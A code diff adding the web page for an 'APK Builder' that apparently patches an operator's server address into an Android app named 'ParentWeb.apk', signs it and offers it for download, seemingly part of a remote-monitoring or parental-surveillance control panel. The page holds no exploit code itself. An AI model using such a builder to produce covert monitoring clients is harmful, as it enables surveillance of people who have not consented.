@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<html class="min-h-screen">
+	<% include partials/head.ejs %>
+
+	<body class="bg-black text-gray-100 min-h-screen flex flex-col">
+
+		<div class="container mx-auto px-4 sm:px-6 lg:px-8 mt-16 flex-grow">
+			<% include partials/header.ejs %>
+			<div class="border-t border-gray-700 my-2 sm:my-4"></div>
+			<% include partials/disclaimer.ejs %>
+			<div class="bg-gray-800 rounded-lg shadow-lg p-4 sm:p-6 my-4 sm:my-6 relative max-w-4xl mx-auto">
+				<div id="dimmer" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+					<div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-center">
+						<div class="animate-spin rounded-full h-10 w-10 sm:h-12 sm:w-12 border-b-2 border-white"></div>
+						<p class="mt-3 sm:mt-4 text-white text-sm sm:text-base" id="loadingText">Submitting</p>
+					</div>
+				</div>
+
+				<h1 class="text-2xl sm:text-3xl font-bold text-center mb-6 sm:mb-8">APK Builder</h1>
+				<div class="w-full max-w-lg mx-auto" id="form">
+					<div class="flex justify-center mb-4 sm:mb-6">
+						<div class="w-full">
+							<div class="flex">
+								<span class="inline-flex items-center px-3 text-sm text-gray-300 bg-gray-600 border border-r-0 border-gray-500 rounded-l-md whitespace-nowrap">
+									http://
+								</span>
+								<input
+									type="text"
+									id="uriInput"
+									class="rounded-r-lg border border-gray-600 flex-1 min-w-0 w-full text-sm sm:text-base p-2.5 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-gray-700 text-gray-100 placeholder-gray-400"
+									placeholder="IP / Public URL"
+									title="This is the public url of your server (domain.com)"
+								/>
+							</div>
+						</div>
+					</div>
+					<div class="flex justify-center">
+						<button id="gobuild" class="bg-green-500 hover:bg-green-600 text-white font-semibold py-3 px-6 rounded-lg w-full text-base sm:text-lg flex items-center justify-center gap-2 transition duration-200">
+							<i class="fas fa-wrench"></i>Build
+						</button>
+					</div>
+				</div>
+
+				<div class="w-full max-w-lg mx-auto hidden" id="download">
+					<div class="flex justify-center">
+						<a class="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-3 px-6 rounded-lg w-full text-base sm:text-lg flex items-center justify-center gap-2 transition duration-200" 
+						   download="ParentWeb.apk" 
+						   href="/build-aligned-signed.apk">
+							<i class="fas fa-download"></i>Download
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+
+
+		<script>
+			var loadingTexts = [
+				'Decompiling APK',
+				'Patching Server Information',
+				'Compiling APK',
+				'Signing APK',
+				'Verifying Build',
+				'Finalizing',
+			];
+
+			document.getElementById('uriInput').value = window.location.hostname;
+
+			var loadingIndex = 0;
+			var isDone = false;
+			$('#gobuild').click((e) => {
+				$('#dimmer').removeClass('hidden').addClass('flex');
+				build($('#uriInput').val(), '80');
+				setTimeout(loaderText, 500);
+			});
+			function loaderText() {
+				var nextTimeout = Math.floor(Math.random() * 1500) + 700;
+				if (loadingIndex < loadingTexts.length) $('#loadingText').text(loadingTexts[loadingIndex++]);
+				if (loadingIndex !== loadingTexts.length) setTimeout(loaderText, nextTimeout);
+				else if (loadingIndex === loadingTexts.length && !isDone) setTimeout(loaderText, 300);
+				else
+					while (isDone) {
+						isDone = false;
+						$('#dimmer').fadeOut(500, function() {
+							$(this).addClass('hidden').removeClass('flex');
+						});
+						$('#form').fadeOut(500, () => {
+							$('#download').removeClass('hidden').fadeIn(200);
+						});
+					}
+			}
+
+			const build = async (URI, PORT) => {
+				let data = await $.post('/builder?uri=' + URI + '&port=' + PORT);
+				if (!data.error) isDone = true;
+				else showNotification('#f03434', data.error);
+			};
+		</script>
+		<% include partials/footer.ejs %>
+	</body>
+</html>
